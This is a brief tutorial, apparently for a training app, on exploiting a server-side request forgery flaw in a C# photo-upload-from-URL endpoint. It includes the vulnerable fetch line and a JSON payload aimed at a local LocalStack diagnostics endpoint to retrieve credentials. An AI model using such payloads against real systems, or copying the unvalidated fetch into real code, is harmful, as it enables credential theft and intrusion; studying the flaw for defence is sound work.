# SSRF Exploitation Tutorial: Accessing Internal AWS Services

## Vulnerability Analysis

The vulnerable code in `UploadPhotoFromUrl` accepts a user-provided URL and fetches it server-side without any validation:

```csharp
var response = await httpClient.GetAsync(dto.Url);
```

**Critical Issues:**
1. No URL validation or whitelist
2. No scheme restriction (allows http, https, file, etc.)
3. No hostname validation (allows localhost, 127.0.0.1, internal IPs)
4. No port restriction
5. Server fetches and returns content from ANY URL

## Attack Scenario

LocalStack exposes sensitive AWS configuration endpoints on `localhost:4566`:
- `/_localstack/health` - Service status
- `/_localstack/info` - Configuration details
- `/_localstack/diagnose` - Diagnostic information including credentials

These endpoints are intentionally restricted to localhost for security, but SSRF bypasses this restriction.

## Exploitation Steps

### Craft SSRF Payloads

#### Payload 3: Get Diagnostic Information (Most Sensitive)
```json
{
  "url": "http://localhost:4566/_localstack/diagnose",
  "filename": "diagnose.txt"
}
```

### Execute the Attack
Enter the AWS diagnostic endpoint URL as the recipe picture.

### Retrieve the Stolen Data
Open the browser’s Developer Tools, go to the **Network** tab, and locate the fetched data.
